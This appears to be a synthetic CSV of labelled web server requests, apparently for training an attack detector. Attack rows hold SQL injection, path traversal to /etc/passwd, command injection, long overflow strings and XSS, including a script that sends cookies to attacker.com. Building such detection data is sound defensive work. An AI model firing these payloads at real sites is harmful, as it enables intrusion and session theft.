timestamp,ip,method,path,payload,label
07:21:07.4,192.168.1.175,POST,/auth/register,"{'csrf_token': 'ImCE0LZHbJtul8cHJ2R2z99ywdsH8fPjBf4WBNc4bo'.PF59OJac.xmCNpL8tVl4IiFbsEPw_1D6tFZLv, 'username': 'newuser68', 'email': 'a84@b.com', 'password': 'NucNBYY8Lc@f', 'submit': 'Register'}",0
07:21:08.9,203.162.4.190,GET,/product/1' AND 1=1,,1
07:21:10.9,103.75.118.228,GET,/search?q=' OR 1=1; --,,1
07:21:13.1,203.162.4.191,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:21:14.7,192.168.1.175,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:21:17.4,192.168.1.28,GET,/order/cart,,0
07:21:19.3,10.0.0.146,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:21:21.5,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
07:21:23.3,192.168.1.151,GET,/,,0
07:21:25.6,192.168.1.104,POST,/auth/register,"{'csrf_token': 'ImoUEQSbIEUBR2MmjTcXvrogPKJtXJEIjI6vvxh7dX'.ndqbDYoX.xBOsV6wa9Fv9nmrtGlPxtGXdiApa, 'username': 'newuser55', 'email': 'a99@b.com', 'password': 'kyH10AThhiGv', 'submit': 'Register'}",0
07:21:27.1,103.75.118.228,GET,/../../../../etc/passwd,,1
07:21:29.0,203.162.4.190,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:21:31.4,103.75.118.228,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:21:33.5,203.162.4.190,GET,/../../../../etc/passwd,,1
07:21:35.6,103.75.118.228,GET,/../../../../etc/passwd,,1
07:21:37.3,203.162.4.190,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:21:39.5,203.162.4.190,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:21:41.0,203.162.4.191,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:21:43.6,192.168.1.182,POST,/auth/register,"{'csrf_token': 'ImGDAcF1XselnQ2Litg3xSxjTTMH7oX9opsrXcXFfk'.rNxq3onz.i5dF9wWTF2WGe8r5zG1l6pCgvuam, 'username': 'newuser72', 'email': 'a77@b.com', 'password': 'cn5d**chaRCW', 'submit': 'Register'}",0
07:21:45.3,203.162.4.191,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:21:47.5,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
07:21:49.7,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:21:51.7,192.168.1.12,GET,/auth/login,,0
07:21:52.8,203.162.4.190,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:21:54.9,103.75.118.228,GET,/search?q=<script>alert('XSS')</script>,,1
07:21:57.3,10.0.0.15,POST,/auth/register,"{'csrf_token': 'ImeiiRvdfP80Bt5Gr5u0DN7yGEUQDDepI4cfV2ELE9'.ncENpEZX.0jhjioQNejszxzM7CbWn9HFuSCp4, 'username': 'newuser39', 'email': 'a24@b.com', 'password': 'TyAsbe@O3^it', 'submit': 'Register'}",0
07:21:58.9,203.162.4.191,GET,/product/1,,0
07:22:01.6,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:22:03.5,10.0.0.146,GET,/,,0
07:22:05.2,203.162.4.190,GET,/product/1' AND 1=1,,1
07:22:07.1,203.162.4.190,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
07:22:08.9,203.162.4.191,GET,/auth/register,,0
07:22:10.9,10.0.0.28,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:22:12.8,10.0.0.195,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:22:14.8,103.75.118.228,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:22:16.8,203.162.4.191,GET,/../../../../etc/passwd,,1
07:22:19.3,203.162.4.191,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:22:21.7,10.0.0.106,GET,/product/2,,0
07:22:23.1,192.168.1.151,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:22:25.3,192.168.1.167,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:22:27.1,192.168.1.12,GET,/auth/login,,0
07:22:29.2,203.162.4.190,GET,/../../../../etc/passwd,,1
07:22:31.2,192.168.1.185,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:22:33.3,10.0.0.146,POST,/auth/login,"{'csrf_token': 'ImQHj3D86RCmdW1gmjHlLg8HgyZMjoPz5oOVHACzOM'.1JhPuDox.nhWZUwcOvqE9yIrkXv2SjzQ9Pp7s, 'username': 'user65', 'password': 'OPYz(3MG*KNA', 'submit': 'Log in'}",0
07:22:35.5,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:22:37.1,203.162.4.190,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:22:39.3,203.162.4.190,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:22:41.0,203.162.4.191,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
07:22:43.2,103.75.118.228,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:22:45.0,10.0.0.15,GET,/order/myorders,,0
07:22:47.6,203.162.4.190,GET,/search?q=' OR 1=1; --,,1
07:22:48.9,10.0.0.176,POST,/auth/register,"{'csrf_token': 'ImJpIKHTwBSaiOkWRJoNHkAJwyG6lYMocQZkSrHTvz'.FRProJL0.UNkDasF0TSpttC53PHAY52FGtmmW, 'username': 'newuser58', 'email': 'a4@b.com', 'password': 'hp8l3Ca*igET', 'submit': 'Register'}",0
07:22:50.8,103.75.118.228,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
07:22:53.4,203.162.4.191,GET,/order/cart,,0
07:22:55.2,192.168.1.169,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:22:57.7,192.168.1.56,GET,/,,0
07:22:59.0,10.0.0.15,POST,/auth/register,"{'csrf_token': 'ImoWtOTJ9ewbYfVHdACtfJj787pGVp53zGCtXM4iFw'.pQnSOVDy.NFGlD-sZfTPc-PNspAupF4p8dLNg, 'username': 'newuser87', 'email': 'a17@b.com', 'password': '2%kCEZ%#2l)1', 'submit': 'Register'}",0
07:23:01.3,10.0.0.82,GET,/auth/register,,0
07:23:03.4,10.0.0.79,GET,/auth/login,,0
07:23:05.6,127.0.0.1,GET,/auth/logout,,0
07:23:07.3,103.75.118.228,GET,/search?q=<script>alert('XSS')</script>,,1
07:23:09.6,192.168.1.46,GET,/order/myorders,,0
07:23:11.7,192.168.1.182,GET,/product/2,,0
07:23:13.3,203.162.4.190,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:23:14.9,10.0.0.146,GET,/,,0
07:23:16.8,192.168.1.50,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:23:19.3,192.168.1.50,GET,/,,0
07:23:21.4,192.168.1.56,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:23:23.0,203.162.4.190,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:23:25.6,203.162.4.190,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
07:23:27.4,203.162.4.191,GET,/../../../../etc/passwd,,1
07:23:29.3,192.168.1.175,GET,/auth/login,,0
07:23:30.8,103.75.118.228,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:23:33.0,192.168.1.104,POST,/auth/register,"{'csrf_token': 'ImD7hbzVOC1fcP0xVafAN8aMty1R27NN7yz5cc80La'.HvnXuNtU.IX5S-Uc8YJKmbFvdZrCO7ruY-kso, 'username': 'newuser66', 'email': 'a26@b.com', 'password': 'C8ckxE##npZZ', 'submit': 'Register'}",0
07:23:35.0,192.168.1.144,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:23:37.7,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:23:39.2,192.168.1.141,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:23:41.4,203.162.4.190,GET,/order/cart,,0
07:23:43.5,192.168.1.46,POST,/auth/register,"{'csrf_token': 'Im74b12dtvsjDx6dOtjUu7C4IDg0mVxMwOOnkdlx8G'.McrO8UR8.NXtq3--6qsvUtPxFpmPM2YmqwpHc, 'username': 'newuser11', 'email': 'a49@b.com', 'password': 'ff2SEc#C@4IH', 'submit': 'Register'}",0
07:23:44.7,192.168.1.169,POST,/auth/register,"{'csrf_token': 'ImniUn2xajzhAGeA59APL0uq3bqcMtGo5PcEdQQ9ai'.pxMVTKFF.q-uX5_iG8TdGUETOHIJPdseM9SvM, 'username': 'newuser17', 'email': 'a26@b.com', 'password': 'hKtBVZkYSBQw', 'submit': 'Register'}",0
07:23:47.3,192.168.1.151,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:23:49.1,10.0.0.106,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:23:51.3,192.168.1.18,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:23:53.4,203.162.4.190,GET,/search?q=' OR 1=1; --,,1
07:23:55.6,10.0.0.28,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:23:57.3,192.168.1.167,POST,/search,{'query': 'iphone 15 pro max'},0
07:23:59.0,192.168.1.165,GET,/auth/logout,,0
07:24:01.0,103.75.118.228,GET,/../../../../etc/passwd,,1
07:24:03.5,192.168.1.28,GET,/auth/login,,0
07:24:05.7,192.168.1.55,GET,/order/myorders,,0
07:24:06.8,192.168.1.22,POST,/auth/login,"{'csrf_token': 'ImgOlsZvuDCsrECPslxtAxhIlPaybicIznLBEbtKxD'.t2m2mWlz.-3p1fhFBR1FAG5WZu9zE7c_vVoT8, 'username': 'user70', 'password': 'ylepye1VH(OI', 'submit': 'Log in'}",0
07:24:09.6,192.168.1.22,GET,/auth/login,,0
07:24:11.2,203.162.4.190,POST,/auth/login,"{'csrf_token': 'Im95zdGXN4X9XiDXXxUzoAiL5eUyedcz7ZBuyGzCTo'.pF2YTfAj.2HEEP15ZLvuY3n1yLV4qlpYjDorg, 'username': 'user67', 'password': '@ARGaK1$CXC7', 'submit': 'Log in'}",0
07:24:13.2,203.162.4.190,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:24:15.2,192.168.1.197,POST,/auth/login,"{'csrf_token': 'ImhjyVc5VzTKuAr5wiSAY2oCZd76uA4ktcOobGYkjV'.o1T6wDEl.GqcG74etQtUE1Vi2JwJSbS0w3Jr2, 'username': 'user61', 'password': 'iXMPcpXS!7@T', 'submit': 'Log in'}",0
07:24:17.2,10.0.0.66,GET,/auth/login,,0
07:24:19.4,103.75.118.228,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:24:20.9,203.162.4.191,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
07:24:23.6,10.0.0.15,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:24:25.1,192.168.1.197,POST,/auth/register,"{'csrf_token': 'ImDF297nvaHuUgZscLMPp2yp6PvY9sTSlK0iF6X97J'.5FtQxkbx.7VdfIuZ1KE6YJDz9jx4B9LPxDLKF, 'username': 'newuser25', 'email': 'a95@b.com', 'password': '5@mvmSdRl^Ag', 'submit': 'Register'}",0
07:24:27.6,10.0.0.67,GET,/auth/login,,0
07:24:29.6,203.162.4.191,GET,/search?q=' OR 1=1; --,,1
07:24:31.4,10.0.0.67,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:24:33.1,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
07:24:35.3,192.168.1.22,GET,/auth/logout,,0
07:24:37.1,192.168.1.22,GET,/product/1,,0
07:24:39.0,203.162.4.191,GET,/product/1' AND 1=1,,1
07:24:41.4,192.168.1.182,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:24:43.6,192.168.1.185,GET,/order/myorders,,0
07:24:45.0,192.168.1.144,GET,/auth/register,,0
07:24:47.3,203.162.4.190,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:24:49.3,192.168.1.12,GET,/product/1,,0
07:24:51.5,10.0.0.106,GET,/order/cart,,0
07:24:53.3,203.162.4.191,GET,/../../../../etc/passwd,,1
07:24:55.2,103.75.118.228,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
07:24:57.0,103.75.118.228,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
07:24:59.6,192.168.1.162,GET,/,,0
07:25:01.4,192.168.1.56,GET,/order/myorders,,0
07:25:03.0,203.162.4.191,GET,/search?q=<script>alert('XSS')</script>,,1
07:25:05.5,10.0.0.67,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:25:07.1,192.168.1.18,GET,/auth/logout,,0
